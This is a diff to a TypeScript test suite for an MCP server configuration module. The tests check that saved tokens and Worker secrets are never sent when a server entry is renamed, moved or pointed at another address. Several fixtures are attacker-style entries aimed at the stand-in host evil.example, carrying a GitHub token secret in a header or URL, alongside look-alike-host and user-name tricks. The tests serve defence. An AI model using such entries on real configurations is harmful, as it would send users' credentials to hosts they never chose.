@@ -1,5 +1,5 @@
 import { readFileSync } from "node:fs";
-import { MASK, expandHeaderTemplates, expandTemplate, expandUrlTemplate, leftBehind, maskForUi, resolveConfigured, restoreMasked, sane, unexpand } from "../src/worker/lib/mcp-config.ts";
+import { MASK, aimedAnew, expandHeaderTemplates, expandTemplate, expandUrlTemplate, leftBehind, maskForUi, resolveConfigured, restoreMasked, sane, unexpand } from "../src/worker/lib/mcp-config.ts";
 
 let pass = 0;
 let fail = 0;
@@ -143,7 +143,7 @@ console.log("\na pasted token survives a save from the panel");
   check("renaming a server keeps its token (matched by URL)", restore(renamed)[0]!.headers!.Authorization === TOKEN);
 
   const moved = sane([{ ...shown[0]!, url: "https://example.com/v2/mcp" }]);
-  check("moving it within its host keeps its token (matched by label)", restore(moved)[0]!.headers!.Authorization === TOKEN);
+  check("moving it, even on the same host, needs it typed again", !("Authorization" in restore(moved)[0]!.headers!));
 
   const stranger = sane([{ label: "new", url: "https://new.example/mcp", headers: { Authorization: MASK } }]);
   check("a mask with nothing behind it is dropped, not stored",
@@ -160,7 +160,7 @@ console.log("\na pasted token survives a save from the panel");
   check("the input list is not mutated", shown[0]!.headers!.Authorization === MASK);
 }
 
-console.log("\na pasted token stays with the host it was saved for");
+console.log("\na pasted token stays with the address it was saved for");
 {
   /*
    * Every family admin can edit this list. Matched by label alone, the owner's
@@ -181,9 +181,11 @@ console.log("\na pasted token stays with the host it was saved for");
   const evil = aim("home", "https://evil.example/mcp");
   check("THE BUG: same label, another host: the token is not put back", evil.value === undefined, evil);
   check("and the panel is told whose to ask for again", JSON.stringify(evil.retype) === '["home"]', evil.retype);
-  const along = aim("home", "https://ha.example.com/v2/mcp");
-  check("same label, same host: kept", along.value === "Bearer literal-token", along);
-  check("with nothing to type again", along.retype.length === 0, along.retype);
+  const same = aim("home", "https://ha.example.com/api/mcp");
+  check("same label, same address: kept", same.value === "Bearer literal-token", same);
+  check("with nothing to type again", same.retype.length === 0, same.retype);
+  // A host can be shared: Nabu Casa's webhook host is every customer's.
+  check("another address on the same host is another server", aim("home", "https://ha.example.com/api/webhook/someone-elses").value === undefined);
   check("a look-alike host is another host", aim("home", "https://ha.example.com.evil.example/api/mcp").value === undefined);
   check("so is one behind a user name", aim("home", "https://ha.example.com@evil.example/api/mcp").value === undefined);
   check("so is another port", aim("home", "https://ha.example.com:8443/api/mcp").value === undefined);
@@ -194,6 +196,7 @@ console.log("\na pasted token stays with the host it was saved for");
     aim("hook", "${HA_MCP_URL}", "X-Key", (u) => expandUrlTemplate(u, {})).value === "hook-key-0123456789");
   check("and at the address the secret holds, written out", aim("hook", env.HA_MCP_URL, "X-Key").value === "hook-key-0123456789");
   check("but not at another host", aim("hook", "https://evil.example/mcp", "X-Key").value === undefined);
+  check("nor at another webhook on the same host", aim("hook", "https://hooks.example/api/webhook/someone-elses", "X-Key").value === undefined);
 }
 
 console.log("\nthrough the route: an admin's moved server never sends the token");
@@ -210,7 +213,7 @@ console.log("\nthrough the route: an admin's moved server never sends the token"
     },
   };
   const call = (method: string, path: string, body: unknown) =>
-    handleMcp(new Request(`https://jarvis.example${path}`, { method, body: JSON.stringify(body) }), env as never);
+    handleMcp(new Request(`https://jarvis.example${path}`, { method, body: JSON.stringify(body) }), env as never, false);
   const moved = { label: "home", url: "https://evil.example/mcp", headers: { Authorization: MASK } };
 
   const sent: { url: string; auth: string | null }[] = [];
@@ -235,6 +238,82 @@ console.log("\nthrough the route: an admin's moved server never sends the token"
   } finally {
     globalThis.fetch = realFetch;
   }
+}
+
+console.log("\nthrough the route: a Worker secret goes somewhere new only for the owner");
+{
+  const { handleMcp } = await import("../src/worker/routes/mcp.ts");
+  const GH = { label: "github", url: "https://mcp.example/sse", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } };
+  const kv = new Map<string, string>([["config:mcp-servers", JSON.stringify({ servers: [GH] })]]);
+  const env = {
+    GITHUB_TOKEN: "gh-token-0123456789abcdef",
+    CONFIG: {
+      get: async (k: string, type?: string) => (kv.has(k) ? (type === "json" ? JSON.parse(kv.get(k)!) : kv.get(k)) : null),
+      put: async (k: string, v: string) => void kv.set(k, v),
+      delete: async (k: string) => void kv.delete(k),
+    },
+  };
+  const call = (method: string, path: string, body: unknown, owner: boolean) =>
+    handleMcp(new Request(`https://jarvis.example${path}`, { method, body: JSON.stringify(body) }), env as never, owner);
+  const mine = { label: "mine", url: "https://evil.example/mcp", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } };
+
+  const sent: string[] = [];
+  const realFetch = globalThis.fetch;
+  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+    sent.push(`${String(input instanceof Request ? input.url : input)} ${new Headers(init?.headers).get("authorization")}`);
+    throw new Error("offline");
+  }) as typeof fetch;
+  try {
+    const test = (await (await call("POST", "/api/mcp/test", mine, false)).json()) as { ok: boolean; error?: string };
+    check("an admin's Test: the secret is sent nowhere", !sent.some((r) => r.includes("gh-token")), sent);
+    check("and the panel is told why", !test.ok && /only the person who set up the family/.test(test.error ?? ""), test);
+    const diag = (await (await call("POST", "/api/mcp/call", { ...mine, tool: "x" }, false)).json()) as { ok: boolean; error?: string };
+    check("an admin's /api/mcp/call: sent nowhere either", !sent.some((r) => r.includes("gh-token")) && !diag.ok, { sent, diag });
+
+    const before = kv.get("config:mcp-servers");
+    const put = await call("PUT", "/api/mcp", { servers: [GH, mine] }, false);
+    check("an admin's Save is refused", put.status === 403 && kv.get("config:mcp-servers") === before, put.status);
+    check("naming the server", /: mine$/.test(((await put.json()) as { error: string }).error));
+    check("an admin's Save that keeps it where it was goes through",
+      (await call("PUT", "/api/mcp", { servers: [{ ...GH, enabled: false }] }, false)).status === 200);
+
+    check("the owner's Save goes through", (await call("PUT", "/api/mcp", { servers: [GH, mine] }, true)).status === 200 &&
+      kv.get("config:mcp-servers")!.includes("evil.example"));
+    sent.length = 0;
+    await call("POST", "/api/mcp/test", mine, false);
+    check("and once the owner has, an admin's Test of it runs", sent.some((r) => r.startsWith("https://evil.example/")), sent);
+  } finally {
+    globalThis.fetch = realFetch;
+  }
+}
+
+console.log("\nonly the owner sends a Worker secret somewhere new");
+{
+  /*
+   * A secret set with `wrangler secret put` for an MCP server has no address
+   * of its own, and every admin can edit the list: one could add a server of
+   * their own with "Bearer ${GITHUB_TOKEN}", or keep the owner's under its
+   * label and point it elsewhere.
+   */
+  const env = { GITHUB_TOKEN: "gh-token-0123456789abcdef", HA_MCP_URL: "https://hooks.example/api/webhook/abcdef0123456789" };
+  const filled = (u: string) => expandUrlTemplate(u, env);
+  const GH = { label: "github", url: "https://mcp.example/sse", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } };
+  const current = sane([GH, HA]);
+  const anew = (incoming: unknown[], now = current) => aimedAnew(sane(incoming), now, filled);
+
+  check("the list as it is: nothing new", anew([GH, HA]).length === 0);
+  check("renamed or turned off: nothing new", anew([{ ...GH, label: "gh", enabled: false }]).length === 0);
+  check("moved, even on the same host: new (a host can be shared)", anew([{ ...GH, url: "https://mcp.example/someone-elses/sse" }]).length === 1);
+  check("removed: nothing new", anew([HA]).length === 0);
+  check("THE HOLE: the owner's server pointed at another host", JSON.stringify(anew([{ ...GH, url: "https://evil.example/sse" }])) === '["github"]');
+  check("an admin's own server using the owner's secret", JSON.stringify(anew([GH, { label: "mine", url: "https://evil.example/mcp", headers: { "X-Key": "${GITHUB_TOKEN}" } }])) === '["mine"]');
+  check("or putting it inside a URL", JSON.stringify(anew([{ label: "mine", url: "https://evil.example/${GITHUB_TOKEN}/sse" }])) === '["mine"]');
+  check("removing the owner's first does not help", JSON.stringify(anew([{ ...GH, url: "https://evil.example/sse" }], sane([HA]))) === '["github"]');
+  check("a look-alike host is another host", anew([{ ...GH, url: "https://mcp.example.evil.example/sse" }]).length === 1);
+  check("a token typed in as-is is not a Worker secret", anew([{ label: "mine", url: "https://evil.example/mcp", headers: { Authorization: "Bearer typed-token" } }]).length === 0);
+  check("a setting keeps to its own addresses already, by fillable()", anew([{ label: "mine", url: "https://evil.example/mcp", headers: { Authorization: "Bearer ${HA_TOKEN}", "X-Tz": "${TIMEZONE}" } }]).length === 0);
+  check("a URL that is one placeholder only goes where it points", anew([{ label: "mine", url: "${OTHER_MCP_URL}" }]).length === 0);
+  check("the repo defaults saved as they are: nothing new", anew(SEED, sane(SEED)).length === 0);
 }
 
 console.log("\n${NAME} never hands one of Jarvis's own keys to a server that is not already sent it");
